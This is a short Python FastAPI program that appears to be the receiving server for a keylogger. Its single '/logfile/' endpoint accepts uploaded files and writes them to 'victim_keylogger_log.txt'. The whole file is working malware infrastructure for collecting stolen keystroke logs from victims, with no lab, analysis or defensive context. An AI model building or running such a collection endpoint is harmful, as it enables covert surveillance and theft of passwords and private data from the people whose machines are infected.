from fastapi import FastAPI, File, UploadFile
import os
import aiofiles
import uvicorn

app = FastAPI()

@app.post('/logfile/')
async def _file_upload(logfile: UploadFile = File(...)):
	async with aiofiles.open("victim_keylogger_log.txt", "wb") as binary_file:
		content = await logfile.read()
		await binary_file.write(content)
		
	return {"Result": "OK"}